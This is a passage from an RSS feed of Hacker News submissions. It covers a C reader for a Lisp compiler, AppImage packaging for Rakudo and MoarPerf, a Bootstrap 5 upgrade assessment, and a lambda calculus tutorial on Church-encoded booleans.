    <span>return</span> <span>read_integer</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>,</span> <span>/*sign=*/</span><span>1</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'-'</span> <span>&amp;&amp;</span> <span>isdigit</span><span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]))</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '-'</span>
    <span>return</span> <span>read_integer</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>,</span> <span>/*sign=*/</span><span>-</span><span>1</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>starts_symbol</span><span>(</span><span>c</span><span>))</span> <span>{</span>
    <span>return</span> <span>read_symbol</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'\''</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '\''</span>
    <span>return</span> <span>read_char</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'#'</span> <span>&amp;&amp;</span> <span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]</span> <span>==</span> <span>'t'</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '#'</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip 't'</span>
    <span>return</span> <span>AST_new_bool</span><span>(</span><span>true</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'#'</span> <span>&amp;&amp;</span> <span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]</span> <span>==</span> <span>'f'</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '#'</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip 'f'</span>
    <span>return</span> <span>AST_new_bool</span><span>(</span><span>false</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'('</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '('</span>
    <span>return</span> <span>read_list</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>}</span>
  <span>return</span> <span>AST_error</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<p>Note that I put the integer cases above the symbol case because we want to
catch <code>-123</code> as an integer instead of a symbol, and <code>-a123</code> as a symbol instead
of an integer.</p>

<p>We‚Äôll probably add more entries to <code>starts_symbol</code> later, but those should
cover the names we‚Äôve used so far.</p>

<p>For each type of subcase (integer, symbol, list), the basic idea is the same:
while we‚Äôre still inside the subcase, add on to it.</p>

<p>For integers, this means multiplying and adding (concatenating digits, so to
speak):</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>read_integer</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>,</span> <span>int</span> <span>sign</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>'\0'</span><span>;</span>
  <span>word</span> <span>result</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>char</span> <span>c</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span> <span>isdigit</span><span>(</span><span>c</span><span>);</span> <span>c</span> <span>=</span> <span>next</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>))</span> <span>{</span>
    <span>result</span> <span>*=</span> <span>10</span><span>;</span>
    <span>result</span> <span>+=</span> <span>c</span> <span>-</span> <span>'0'</span><span>;</span>
  <span>}</span>
  <span>return</span> <span>AST_new_integer</span><span>(</span><span>sign</span> <span>*</span> <span>result</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>It also takes a sign parameter so if we see an explicit <code>-</code>, we can negate the
integer.</p>

<p>For symbols, this means reading characters into a C string buffer:</p>

<div><div><pre><code><span>const</span> <span>word</span> <span>ATOM_MAX</span> <span>=</span> <span>32</span><span>;</span>

<span>bool</span> <span>is_symbol_char</span><span>(</span><span>char</span> <span>c</span><span>)</span> <span>{</span>
  <span>return</span> <span>starts_symbol</span><span>(</span><span>c</span><span>)</span> <span>||</span> <span>isdigit</span><span>(</span><span>c</span><span>);</span>
<span>}</span>

<span>ASTNode</span> <span>*</span><span>read_symbol</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>buf</span><span>[</span><span>ATOM_MAX</span> <span>+</span> <span>1</span><span>];</span> <span>// +1 for NUL</span>
  <span>word</span> <span>length</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>length</span> <span>=</span> <span>0</span><span>;</span> <span>length</span> <span>&lt;</span> <span>ATOM_MAX</span> <span>&amp;&amp;</span> <span>is_symbol_char</span><span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span><span>]);</span> <span>length</span><span>++</span><span>)</span> <span>{</span>
    <span>buf</span><span>[</span><span>length</span><span>]</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>}</span>
  <span>buf</span><span>[</span><span>length</span><span>]</span> <span>=</span> <span>'\0'</span><span>;</span>
  <span>return</span> <span>AST_new_symbol</span><span>(</span><span>buf</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>For simplicity‚Äôs sake, I avoided dynamic resizing. We only get at most symbols
of size 32. Oh well.</p>

<p>Note that symbols can also have trailing numbers in them, just not at the front
‚Äî like <code>add1</code>.</p>

<p>For characters, we only have three potential input characters to look at:
quote, char, quote. No need for a loop:</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>read_char</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'\''</span><span>)</span> <span>{</span>
    <span>return</span> <span>AST_error</span><span>();</span>
  <span>}</span>
  <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>if</span> <span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span><span>]</span> <span>!=</span> <span>'\''</span><span>)</span> <span>{</span>
    <span>return</span> <span>AST_error</span><span>();</span>
  <span>}</span>
  <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>return</span> <span>AST_new_char</span><span>(</span><span>c</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This means that input like <code>''</code> or <code>'aa'</code> will be an error.</p>

<p>For booleans, we can tackle those inline because there‚Äôs only two cases and
they‚Äôre both trivial. Check for <code>#t</code> and <code>#f</code>. Done.</p>

<p>And last, for lists, it means we recursively build up pairs until we get to
<code>nil</code>:</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>read_list</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>skip_whitespace</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>')'</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span>
    <span>return</span> <span>AST_nil</span><span>();</span>
  <span>}</span>
  <span>ASTNode</span> <span>*</span><span>car</span> <span>=</span> <span>read_rec</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>assert</span><span>(</span><span>car</span> <span>!=</span> <span>AST_error</span><span>());</span>
  <span>ASTNode</span> <span>*</span><span>cdr</span> <span>=</span> <span>read_l‚Ä¶</span></code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bernsteinbear.com/blog/compiling-a-lisp-6/">https://bernsteinbear.com/blog/compiling-a-lisp-6/</a></em></p>]]>
            </description>
            <link>https://bernsteinbear.com/blog/compiling-a-lisp-6/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580453</guid>
            <pubDate>Thu, 24 Sep 2020 16:35:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Can you AppImageine that? ‚Äì Timo Paulssen]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580439">thread link</a>) | @lizmat
<br/>
September 24, 2020 | https://wakelift.de/can-you-appimageine-that/ | <a href="https://web.archive.org/web/*/https://wakelift.de/can-you-appimageine-that/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1543352631-6b884eafab2f?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1543352631-6b884eafab2f?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1543352631-6b884eafab2f?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1543352631-6b884eafab2f?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1543352631-6b884eafab2f?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Can you AppImageine that?">
            </figure>

            <section>
                <div>
                    <figure><img src="https://images.unsplash.com/photo-1558906050-d6d6aa390fd3?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="This old green toolbox wears its age well and hints at owners long past, their workday woes and triumphs‚Äîthe daily grind. " srcset="https://images.unsplash.com/photo-1558906050-d6d6aa390fd3?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=600&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w, https://images.unsplash.com/photo-1558906050-d6d6aa390fd3?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w, https://images.unsplash.com/photo-1558906050-d6d6aa390fd3?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1600&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1600w, https://images.unsplash.com/photo-1558906050-d6d6aa390fd3?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2400&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@shs521?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Susan Holt Simpson</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>I have been unsatisfied with the installation process for MoarPerf for a little while now. You have to either compile the javascript (and css) yourself using npm (or equivalent) which takes a little while, or you have to rely on me releasing an "everything built for you" version to my github repo.</p><p>The last few days I've repeatedly bonked my metaphorical pickaxe against the stone wall that is unpleasantly long build times and an endless stream of small mistakes in order to bring you MoarPerf in an AppImage.</p><p>AppImage is a format for linux programs that allows programs to be distributed as a single executable file without a separate install process.</p><p><a href="https://github.com/timo/moarperf/releases">The AppImage for MoarPerf</a> includes a full Rakudo along with the dependencies of MoarPerf, the built javascript, and the Raku code. This way you don't even have to have a working Rakudo installation on the machine you want to use to analyze the profiler results. Yours truly tends to put changes in MoarVM or nqp or Rakudo that sometimes prevent things from working fine, and resetting the three repos back to a clean state and rebuilding can be a bit of an annoyance.</p><p>With the MoarPerf AppImage I don't have to worry about this at all any more! That's pretty nice.</p><h2 id="appimages-for-everyone-">AppImages for Everyone!</h2><p>With an AppImage created for MoarPerf it was not too much work to make <a href="https://github.com/timo/rakudo-appimage/releases">an AppImage for Rakudo</a> without a built-in application.</p><p>The next step is, of course, to pack everything up nicely to create a one-or-two-click solution to build AppImages for any script that you may be interested in running.</p><p>There has also already been a module that <a href="https://github.com/jnthn/p6-app-installermaker-wix">creates a windows installer for a Raku program</a> by installing a custom MoarVM/nqp/Rakudo into a pre-determined path (a limitation from back when Rakudo wasn't relocatable yet), and maybe I should offer an installer like this for windows users, too? The AppImage works much like this, too, except it already makes use of the work that made Rakudo relocatable, so it doesn't need to run in a pre-defined path.</p><p>If you want to give building AppImages a try as well, feel free to <a href="https://github.com/timo/rakudo-appimage">steal everything from the rakudo-appimage repository</a>, and have a look at the <code>.travis.yml</code> and the <code>appimage</code> folder in <a href="https://github.com/timo/moarperf">the moarperf repo</a>!</p><p>In any case, I would love to hear from people, whether the AppImages for Rakudo and MoarPerf work on their machines, and what modules/apps they would like to have in an AppImage. Feel free to message me on twitter, write to the Raku users mailing list, or find me on freenode as <code>timotimo</code>.</p><p>Thanks for reading, stay safe, and see y'all later!</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://wakelift.de/can-you-appimageine-that/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580439</guid>
            <pubDate>Thu, 24 Sep 2020 16:34:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Bootstrap 5 ready to be used in production?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580423">thread link</a>) | @volkandkaya
<br/>
September 24, 2020 | https://versoly.com/blog/bootstrap5-production-ready | <a href="https://web.archive.org/web/*/https://versoly.com/blog/bootstrap5-production-ready">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="story">
                    <p>At Versoly we use Bootstrap 4 for our blocks and templates and have seen a bunch of templates already start using Bootstrap 5. I wanted to see if it was worth porting our code from 4 to 5 or should we wait.</p>
<p>First step for us was to see how much work it would require to port over.</p>
<h3>Remove JQuery</h3>
<p>Bootstrap 5 is removing JQuery as a dependency. That is great for page speed, but it also means that lots of plugins will stop working if they require it as well.</p>
<p>Luckily the team at Bootstrap 5 announced a long time ago that they‚Äôre removing it and we have been careful to not include JQuery code or libraries that require it.</p>
<p>It looks like the internals have changed but the external is still the same so that means no need to edit existing HTML to fit.</p>
<h3>Extra Colors</h3>
<div><p>Bootstrap 5 includes a lot more </p><a href="https://v5.getbootstrap.com/docs/5.0/customize/color/#theme-colors"><u>colors</u></a><p>, but they don‚Äôt seem to be easily accessible. You have to add them into the SCSS. Which makes sense for web apps, but for landing page templates not so much.</p><p>

I was hoping that like Tailwind CSS they would include them all. This would make it possible to use class=‚Äùbtn btn-blue-100‚Äù. We try to follow Bootstrap as much as possible so most likely won‚Äôt make this available.</p></div>
<h3>Updated forms</h3>
<p>Most of the form code is the same, however for switches they have changed custom-switch to form-switch which will break our current forms that use a switch.</p>
<h3>Enhanced grid system</h3>
<p>A new grid tier has been added xxl which is for screens larger than 1400px. Lots of our customers use 1920 and 2560 so this will change the design of the website for a lot of them.</p>
<h3>Responsive Font Sizes</h3>
<p><a href="https://github.com/twbs/rfs"><u>RFS</u></a> has been added to Bootstrap 5 which allows fonts to change size depending on screen size. We already implemented this in our Bootstrap 4 code. It makes working with font sizes a lot easier. However if you have fixed designs it will break the design of your website.</p>
<h3>Any breaking changes in GitHub issues?</h3>
<p><strong>V5.0.0-alpha2</strong> has 191 shipped issues, lots of them are just bumping up versions. However there are bug fixes and new features being introduced.</p>
<p><a href="https://github.com/twbs/bootstrap/pull/31280"><u>Extra position utilities</u></a> are being added that will allow ‚Äúposition-absolute top-0‚Äù. This will allow us to clean up some extra CSS we have added for our newer templates.</p>
<p>Also seems to be a bugger with the <a href="https://github.com/twbs/bootstrap/pull/31649"><u>gutters</u></a>. ‚ÄúGrid container, row, and column padding/margin should always match.‚Äù at the moment not all the gutters match. This would add extra support tickets when elements don‚Äôt align.</p>
<p><strong>V5.0.0-alpha3 </strong>has 9 approved changes, 6 in review and 26 in the inbox as of 22nd Sept.</p>
<p>One of the new features is <a href="https://github.com/twbs/bootstrap/pull/30571"><u>font size utility</u></a>, we have already added an extra display 5 and 6 to our Boostrap 4 code. Bootstrap 5 decided to do that as well. With these new utility classes you will be able to change the size based on screen size. Seems to be some conflicts with RFS, so we will need to investigate more if we can use these inside Versoly.</p>
<p>They might also be changing <a href="https://github.com/twbs/bootstrap/issues/29989"><u>rounded-sm</u></a> to something less confusing which would break our Bootstrap 4 blocks and templates. We could easily fix our end by just replacing it with its equivalent for customers who upgrade to Bootstrap 5.</p>
<h3>Worth it?</h3>
<p>Not many changes are required to get Versoly working for Bootstrap 5 alpha1. The biggest issues for us would be the switch inputs and the new grid tier. We could most likely fix the switch issue at our end and notify the customer that the grid system has changed.</p>
<p>However there seems to be some bugs (to be expected in alpha1) and new features coming out.</p>
<p>For us we will wait until at least Bootstrap 5 alpha3 is released and will look at what they have planned for alpha4 or the beta.</p>
<p>If you‚Äôre working on a web app or a single website, it might be worth upgrading now. The website will load faster and if you upgrade with each alpha release you will have less technical debt. You will need to check if there are any bugs you will encounter when upgrading.</p>
                </article></div>]]>
            </description>
            <link>https://versoly.com/blog/bootstrap5-production-ready</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580423</guid>
            <pubDate>Thu, 24 Sep 2020 16:33:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[All you need is Œª, part one: booleans]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580312">thread link</a>) | @azhenley
<br/>
September 24, 2020 | https://antitypical.com/posts/2020-03-29-all-you-need-is-lambda-1-booleans/ | <a href="https://web.archive.org/web/*/https://antitypical.com/posts/2020-03-29-all-you-need-is-lambda-1-booleans/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    


    <div role="main">
      <div>
        

<article>
  <p>Nearly a century ago, Alonzo Church invented the simple, elegant, and yet elusive lambda calculus. Along with Alan Turing, he then proved the Church-Turing thesis: that anything computable with a Turing machine can also be computed in the lambda calculus. However, nearly as soon as we had digital computers, we started inventing programming languages, and with them a vast treasure of features, beautiful and terrible, many of which seem very hard to relate to the fundamental nature of computability, let alone the lambda calculus specifically.</p>
<!--more-->
<p>While it‚Äôs true that anything which can be computed, period, can be computed in the lambda calculus, you might not want to: it‚Äôs austere, to say the least, and was not designed with modern sensibilities regarding readability in mind. We developed all those languages and features for a reason! Still, Church demonstrated not just that it was possible to compute anything computable with the lambda calculus, but also <em>how</em> one might do so.</p>
<p>In this series, we‚Äôll examine some ways to express common programming language features using the minimalistic tools of the lambda calculus. We begin with perhaps the most ubiquitous type: booleans.</p>
<h2 id="Œª-is-blind">Œª is blind</h2>
<p>The lambda calculus‚Äôs austerity is extreme: you don‚Äôt even have booleans. All you have are:</p>
<ol type="1">
<li><p>Lambda abstractions;</p></li>
<li><p>Applications; and</p></li>
<li><p>Variables.</p></li>
</ol>
<p>We‚Äôll now review these in some detail; feel free to skip this section if you‚Äôre already familiar with the lambda calculus.</p>
<h3 id="lambda-abstractions">Lambda abstractions</h3>
<p>Lambda abstractions (‚Äúlambdas,‚Äù ‚Äúabstractions,‚Äù and ‚Äúfunctions‚Äù will also be used interchangeably) introduce a function of a single variable.</p>
<p>Abstractions are written <code>Œª x . y</code>, for variable <code>x</code> and expression <code>y</code>, where <code>x</code> is now available as a bound variable in the body, and any enclosing definition of <code>x</code> is shadowed (i.e.&nbsp;<code>Œª x . Œª x . x</code> = <code>Œª x . Œª y . y</code> ‚â† <code>Œª x . Œª y . x</code>). (We shall assume strictly lexical scoping for the time being.)</p>
<p>In Haskell, we would write <code>\ x -&gt; y</code> instead; in JavaScript, <code>function (x) { return y }</code> or <code>(x) =&gt; y</code>.</p>
<h3 id="applications">Applications</h3>
<p>Applications (‚Äúfunction application‚Äù and ‚Äúfunction call‚Äù will be used interchangeably) apply the result of the expression on the left to the expression on the right.</p>
<p>Applications are written as <code>x y</code>, for expressions x and y, and left-associated, i.e.&nbsp;<code>a b c</code> = <code>(a b) c</code> ‚â† <code>a (b c)</code>. Function application binds tighter than lambda abstraction, i.e.&nbsp;<code>Œª x . Œª y . y x</code> = <code>Œª x . Œª y . (y x)</code> ‚â† <code>Œª x . (Œª y . y) x</code>.</p>
<p>The syntax is the same in Haskell; in JavaScript, we would write <code>x(y)</code> or <code>a(b, c)</code>. Note however that since lambda calculus functions are all single-argument functions, a more direct (though less idiomatic) equivalent for the latter would be <code>a(b)(c)</code>.</p>
<h3 id="variables">Variables</h3>
<p>Variables introduced by enclosing lambdas.</p>
<p>Variable are written as more or less arbitrary names, typically alphanumeric (e.g.&nbsp;<code>x</code> or <code>y0</code> or <code>thing</code>); however, we will feel free to include non-alphanumeric characters in names as we see fit, since the paucity of syntax means there‚Äôs little risk of ambiguity.</p>
<p>Since the only available variables are those bound by enclosing lambdas, we can also infer that there are no <code>let</code> bindings for local variables, and no globals of any sort; the lambda calculus doesn‚Äôt come with a standard library.</p>
<h3 id="summary">Summary</h3>
<p>In quasi-BNF, the grammar for the lambda calculus is extremely minimal:</p>
<figure>
<p><em>e</em> <strong>:=</strong> <code>Œª</code> <em>x</em> <code>.</code> <em>e</em> <strong>|</strong> <em>e</em> <em>e</em> <strong>|</strong> <em>x</em> <strong>|</strong> (<em>e</em>)</p>
</figure>
<p>And finally, this table gives a side-by-side comparison of the syntax of the lambda calculus with the corresponding syntax in Haskell &amp; JavaScript:</p>
<table>
<caption>
Syntax of the lambda calculus, Haskell, &amp; JavaScript
</caption>
<thead>
<tr>
<th scope="col">
</th>
<th scope="col">
Lambda calculus
</th>
<th scope="col">
Haskell
</th>
<th scope="col">
JavaScript
</th>
</tr>
</thead>
<tbody>
<tr>
<th scope="row">
Abstraction
</th>
<td>
<code>Œª x . y</code>
</td>
<td>
<code>\ x -&gt; y</code>
</td>
<td>
<code>(x) =&gt; y</code>
</td>
</tr>
<tr>
<th scope="row">
Application
</th>
<td>
<code>f x</code>
</td>
<td>
<code>f x</code>
</td>
<td>
<code>f(x)</code>
</td>
</tr>
<tr>
<th scope="row">
Variable
</th>
<td>
<code>x</code>
</td>
<td>
<code>x</code>
</td>
<td>
<code>x</code>
</td>
</tr>
</tbody>
</table>

<h2 id="unconditional-Œª">Unconditional Œª</h2>
<p>Lambdas are the only way to introduce values‚Äîthey‚Äôre the only ‚Äúliteral‚Äù syntax in the language. We can therefore infer that the only kinds of runtime values must be closures. In an interpreter for the lambda calculus, closures might consist of the name of the introduced variable, the body of the lambda, &amp; a map relating the names and values of any variables it closed over when constructed (again, we assume strict lexical scoping). There are no bits, bytes, words, pointers, or objects in the language‚Äôs semantics; only this runtime representation of lambdas.</p>
<p>Likewise, lambdas are also the only way to introduce variables‚Äîthere‚Äôs no standard library, built-ins, primitives, prelude, or global environment to provide common definitions. We‚Äôre truly baking the apple pie from scratch.</p>
<p>All of this raises the question: how do you <em>do</em> anything when you don‚Äôt even have <code>true</code> and <code>false</code>? Lambdas and variables don‚Äôt <em>do</em>, they merely <em>are</em>, so that leaves application. When all you have is application, everything looks like a lambda abstraction, so we‚Äôll represent booleans using lambdas.</p>
<p>Of course, it‚Äôs not <em>just</em> booleans we‚Äôre after; <code>true</code> and <code>false</code> aren‚Äôt much use without <code>and</code>, <code>or</code>, <code>not</code>, <code>if</code>, and all the rest. To be useful, our representation of booleans should therefore suffice to define these, as well. But how do you define <code>if</code> without using <code>if</code>? In a lazy language like Haskell, we might define <code>if</code> as a function something like so:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>if_ ::</span> <span>Bool</span> <span>-&gt;</span> a <span>-&gt;</span> a <span>-&gt;</span> a</span>
<span id="cb1-2">if_ cond then_ else_ <span>=</span> <span>if</span> cond <span>then</span> then_ <span>else</span> else_</span></code></pre></div>
<p>In a strict language like JavaScript, we‚Äôd instead take functions for the alternatives:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>function</span> <span>if_</span>(cond<span>,</span> then_<span>,</span> else_) {</span>
<span id="cb2-2">  <span>if</span> (cond) {</span>
<span id="cb2-3">    <span>then_</span>()<span>;</span></span>
<span id="cb2-4">  } <span>else</span> {</span>
<span id="cb2-5">    <span>else_</span>()<span>;</span></span>
<span id="cb2-6">  }</span>
<span id="cb2-7">}</span></code></pre></div>
<p>Both these definitions use the language‚Äôs native booleans and <code>if</code> syntax (a tactic for implementing embedded DSLs known as ‚Äúmeta-circularity‚Äù), and thus aren‚Äôt viable in the lambda calculus. However, they do give us a hint: in both cases we have a function taking a condition, consequence, and alternative, and using the first to select one of the latter two. In the lambda calculus, we might start by writing:</p>
<pre><code>if = Œª cond then else . ?</code></pre>
<p>(Note: there aren‚Äôt any keywords in the lambda calculus, so there‚Äôs nothing stopping me from naming variables things like <code>if</code>, a fact which I will take free advantage of.)</p>
<p>We‚Äôve introduced a definition for <code>if</code>, as a function of three parameters; now what do we do with them? The lambda calculus‚Äôs stark palette makes it easy to enumerate <em>all</em> the things we can do with some variable <code>a</code>:</p>
<ol type="1">
<li><p>Ignore it, whether by simply not mentioning it at all (as in <code>Œª a . Œª b . b</code>), or by shadowing it with another lambda which binds the same name (as in <code>Œª a . Œª a . a</code>).</p></li>
<li><p>Mention it, whether on its own in the body of a lambda (as in <code>Œª a . a</code> or <code>Œª a . Œª b . a</code>), somewhere within either side of an application (as in <code>Œª a . Œª b . a b</code> or <code>Œª a . Œª b . b a</code>), or some combination of both (as in <code>Œª a . (Œª b . a) a</code>).</p></li>
</ol>
<p>We could for example simply return <code>then</code> or <code>else</code>:</p>
<pre><code>if = Œª cond then else . then
if = Œª cond then else . else</code></pre>
<p>But in that case the conditional isn‚Äôt conditional at all‚Äîthe value in no way depends on <code>cond</code>. Clearly the body must make use of all three variables if we want it to behave like the <code>if</code>s we know and love from other languages.</p>
<p>Taking a step back for a moment, let‚Äôs examine the roles of <code>if</code>‚Äôs arguments. <code>then</code> and <code>else</code> are passive; we only want to use or evaluate one or the other depending on the value of <code>cond</code>. <code>cond</code>, then, is the key: it takes the active role.</p>
<p>Thus, in the same way that our <code>if_</code> functions in Haskell &amp; JavaScript employed those language‚Äôs features to implement, we‚Äôre going to define <code>if cond then else</code> as the application of the condition to the other two parameters:</p>
<pre><code>if = Œª cond then else . cond then else</code></pre>

<p>This feels strangely like cheating: surely we‚Äôve only moved the problem around. Now instead of <code>if</code> making the decision about which argument to return, we‚Äôve deferred it to <code>cond</code>. But <code>if</code> and <code>cond</code> aren‚Äôt the same, semantically; <code>if</code> takes a boolean and two other arguments and returns one of the latter, while <code>cond</code> <em>is</em> a boolean‚Äîalbeit evidently a boolean represented as a function. Let‚Äôs make that precise by writing down <code>if</code>‚Äôs type:</p>
<pre><code>if : Bool -&gt; a -&gt; a -&gt; a</code></pre>
<p>Notwithstanding our use of the yet-to-be-defined name <code>Bool</code> for the type of the condition, this is the same type as we gave <code>if_</code> in Haskell; that‚Äôs a good sign that we‚Äôre on the right track! It takes a <code>Bool</code> and two arguments of type <code>a</code>, and it must return one of those because that‚Äôs the only way for it to come up with the <code>a</code> that it returns. But what <em>is</em> <code>Bool</code>?</p>
<p>Working backwards from the type and definition of <code>if</code>, we see that <code>cond</code> is applied to two arguments, and therefore must be a function of two parameters. Further, these are both of type <code>a</code>, and the value it returns must also be of type <code>a</code> for <code>if</code>‚Äôs type to hold. Thus, we can define the type <code>Bool</code> like so:</p>
<pre><code>Bool = ‚àÄ a . a -&gt; a -&gt; a</code></pre>

<p>If a given <code>Bool</code> is a function of two arguments of arbitrary type, returning the same type, it must therefore select one of its arguments to return. There are only two distinguishable inhabitants of <code>Bool</code>, <code>true</code> and <code>false</code>, so we can therefore deduce that since <code>if</code> defers the selection of the result to the <code>Bool</code>, for <code>true</code> and <code>false</code> to actually differ they must make opposite selections. In other words, <code>true</code> must return the <code>then</code> parameter, while <code>false</code> must return the <code>else</code> one:</p>
<pre><code>true, false : Bool
true  = Œª then else . then
false = Œª then else . else</code></pre>
<p>We didn‚Äôt move the problem around after all; we solved it. What we noticed was a deeper insight: this encoding of booleans makes <code>if</code> redundant, since if we can apply <code>if</code> to a <code>Bool</code> and two arguments, we could equally apply the <code>Bool</code> to those arguments directly.</p>

